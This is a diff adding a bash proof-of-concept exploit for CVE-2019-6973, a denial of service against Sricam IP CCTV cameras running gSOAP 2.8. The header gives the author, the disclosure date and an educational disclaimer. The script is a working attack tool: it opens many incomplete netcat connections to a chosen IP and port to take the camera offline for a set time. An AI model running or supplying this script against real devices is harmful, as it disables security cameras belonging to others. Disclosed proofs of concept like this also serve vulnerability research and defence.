@@ -1,0 +1,40 @@
+#!/bin/bash
+
+#######################################################################################
+#
+#     Exploit Title: Sricam gSOAP 2.8 - Denial of Service
+#              Date: 25/01/2019           
+#     Vendor Status: Informed (24/10/2018)
+#            CVE ID: CVE-2019-6973
+#    Exploit Author: Andrew Watson
+#           Contact: https://keybase.io/bitfu
+#  Software Version: Sricam gSOAP 2.8
+#   Vendor Homepage: http://www.sricam.com/
+#         Tested on: Sricam IP CCTV Camera running gSOAP 2.8 on TCP/5000
+#       PoC Details: Sricam IP CCTV Camera's are vulnerable to denial of service,
+#                    exploitable by sending multiple incomplete requests.
+#        References: https://github.com/bitfu/sricam-gsoap2.8-dos-exploit
+#
+#        DISCLAIMER: This proof of concept is provided for educational purposes only!
+#
+#######################################################################################
+
+
+if [ -z "$3" ]; then
+	echo "#############################################################################"
+	echo -e "[*] Sricam gSOAP 2.8 Denial of Service exploit by bitfu"
+	echo -e "\n[*] Usage: $0 <IP_Address> <Port> <#_DoS_Payloads>"
+	echo "[*] Example: $0 127.0.0.1 5000 10"
+	echo -e "\n[!] Each DoS payload sent adds another 20 seconds downtime.\n"
+	exit 0
+fi
+
+time=$(expr $3 \* 20)
+echo "[*] Sricam gSOAP 2.8 Denial of Service exploit by bitfu"
+echo -e "\n[+] Sending $3 DoS payloads..."
+echo "[+] Expected downtime: $time seconds"
+for dos in $(seq 1 $3); do
+netcat $1 $2 &
+done
+echo -e "\n[!] $dos DoS payloads sent to: $1:$2"
+echo
